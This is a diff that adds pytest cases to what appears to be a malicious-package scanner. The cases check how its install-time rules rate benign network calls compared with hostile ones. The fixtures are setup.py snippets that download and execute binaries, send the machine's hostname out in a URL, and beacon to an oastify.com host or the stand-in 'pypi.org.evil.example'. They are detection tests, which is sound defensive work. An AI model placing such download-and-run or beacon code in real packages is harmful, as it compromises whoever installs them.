@@ -1289,3 +1289,50 @@ def test_pth_importing_own_module_is_medium_and_module_is_still_checked():
 def test_pth_with_code_or_foreign_import_stays_high(line):
     files = {**_WHEEL, "x.pth": line + "\n", "_p_startup.py": "x = 1\n"}
     assert [f.severity for f in _pth(files)] == [Severity.HIGH]
+
+
+from engine.rules.install_time import RULE_BENIGN_NET  # noqa: E402
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        # rubka·sigmaflow — import 시 PyPI 로 최신 버전 확인
+        {**_INIT, "p-1/pkg/__init__.py": "import requests\n"
+         "def _check():\n    requests.get(f'https://pypi.org/pypi/{__name__}/json', timeout=2)\n"
+         "_check()\n"},
+        {**_INIT, "p-1/pkg/__init__.py": "import socket\n"
+         "socket.create_connection(('localhost', 11434), timeout=0.2)\n"},
+        # ai-edge-litert-sdk-* — setup.py 가 SDK 를 받기만 하고 실행하지 않는다
+        {"p-1/setup.py": "from urllib.request import urlretrieve\nURL = 'https://x/sdk.tgz'\n"
+                         "urlretrieve(URL, 'vendor/sdk.tgz')\nsetup(name='p')\n"},
+    ],
+)
+def test_version_check_and_download_only_are_medium(files):
+    found = _install_time_findings(files) + [
+        f for f in analyze_files({"p-1/PKG-INFO": "Name: p", **files}) if f.rule == RULE_BENIGN_NET]
+    assert any(f.rule == RULE_BENIGN_NET for f in found)
+    assert RULE_INSTALL_TIME not in _high_rules(files)
+
+
+@pytest.mark.parametrize(
+    "src",
+    [
+        # 받아서 실행 — 같은 setup.py 범위에 실행이 있다
+        "from urllib.request import urlretrieve\nimport os\n"
+        "urlretrieve('https://x/a.bin', 'a.bin')\nos.startfile('a.bin')\n",
+        "from urllib.request import urlretrieve\nimport subprocess\n"
+        "urlretrieve('https://x/a', '/tmp/a')\nsubprocess.Popen(['/tmp/a'])\n",
+        # 실행 파일·시작 프로그램 폴더로 저장 (다음 로그인 때 실행)
+        "from urllib.request import urlretrieve\nurlretrieve('https://x/u', 'update.exe')\n",
+        # 호스트 정보를 실어 보낼 수 있게 URL 을 조립
+        "import socket\nfrom urllib.request import urlretrieve\n"
+        "urlretrieve('https://x/?h=' + socket.gethostname(), 'f')\n",
+        # 상수 주소 GET — 의존성 혼동 PoC 의 비콘 형태
+        "import requests\nrequests.get('https://abc.oastify.com')\n",
+        # PyPI 가 아닌 곳으로 보내는 버전 확인 모양
+        "import requests\nrequests.get('https://pypi.org.evil.example/x')\n",
+    ],
+)
+def test_download_then_run_or_beacon_stays_high(src):
+    assert RULE_INSTALL_TIME in _high_rules({"p-1/setup.py": src})
